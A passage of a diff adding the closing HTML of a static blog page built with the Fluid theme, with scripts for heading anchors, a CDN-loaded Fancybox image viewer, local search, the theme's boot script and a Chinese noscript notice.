+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
